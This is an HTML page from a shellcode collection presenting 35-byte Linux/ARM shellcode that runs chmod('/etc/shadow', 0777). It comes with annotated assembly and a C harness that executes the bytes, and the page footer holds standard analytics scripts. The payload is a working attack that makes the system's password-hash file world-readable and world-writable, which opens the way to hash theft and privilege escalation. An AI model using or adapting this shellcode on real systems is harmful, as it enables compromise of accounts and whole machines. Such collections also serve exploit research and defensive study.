<html><head><title>Linux/ARM - chmod(/etc/shadow, 0777) Shellcode - 35 Bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 | Title:    Linux/ARM chmod(&quot;/etc/shadow&quot;, 0777) Shellcode 35 Bytes
 | Type:     Shellcode
 | Author:   Florian Gaultier &lt;florian.gaultier@shell-storm.org&gt;
 | Platform: Linux ARM (ARM926EJ-S rev 5 (v51))
 | [+]       http://www.shell-storm.org
*/

#include &lt;stdio.h&gt;


char shellcode[] = &quot;\x01\x60\x8f\xe2&quot;   // add   r6, pc, #1
                   &quot;\x16\xff\x2f\xe1&quot;   // bx    r6
                   &quot;\x78\x46&quot;           // mov   r0, pc
                   &quot;\x0c\x30&quot;           // adds  r0, #12
                   &quot;\xff\x21&quot;           // movs  r1, #255
                   &quot;\xff\x31&quot;           // adds  r1, #255
                   &quot;\x0f\x27&quot;           // movs	 r7, #15
                   &quot;\x01\xdf&quot;           // svc   1
                   &quot;\x01\x27&quot;           // movs  r7, #1
                   &quot;\x01\xdf&quot;           // svc   1
                   &quot;/etc/shadow&quot;;

int main()
{
        (*(void(*)()) shellcode)();

return 0;
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
